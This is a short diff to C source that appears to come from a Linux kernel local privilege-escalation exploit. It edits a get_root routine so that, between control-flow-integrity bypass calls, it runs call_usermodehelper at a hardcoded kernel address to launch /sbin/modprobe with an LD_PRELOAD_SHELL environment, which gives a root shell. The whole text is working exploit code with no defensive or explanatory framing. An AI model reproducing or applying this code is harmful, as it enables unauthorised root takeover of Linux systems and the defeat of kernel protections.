@@ -164,7 +164,7 @@ struct kernel_info kernels[] = {
 
 int (*call_usermodehelper)(const char *, void *, void *, int) = (void *)X_call_usermodehelper;
 
-static void get_root_real(void) {
+static inline void get_root_real(void) {
 	char *argv[] = { (char []){ "/sbin/modprobe" }, NULL };
 	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, NULL };
 	call_usermodehelper(argv[0], argv, envp, 1);
@@ -198,7 +198,12 @@ void get_root()
 {
 	struct stack_frame frames[ 8 ];
 	cfi_bypass_enter(frames, sizeof(frames) / sizeof(frames[0]));
-	get_root_real();
+//	get_root_real();
+{
+	char *argv[] = { (char []){ "/sbin/modprobe" }, NULL };
+	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, NULL };
+	call_usermodehelper(argv[0], argv, envp, 1);
+}
 	cfi_bypass_leave(frames, sizeof(frames) / sizeof(frames[0]));
 }
 
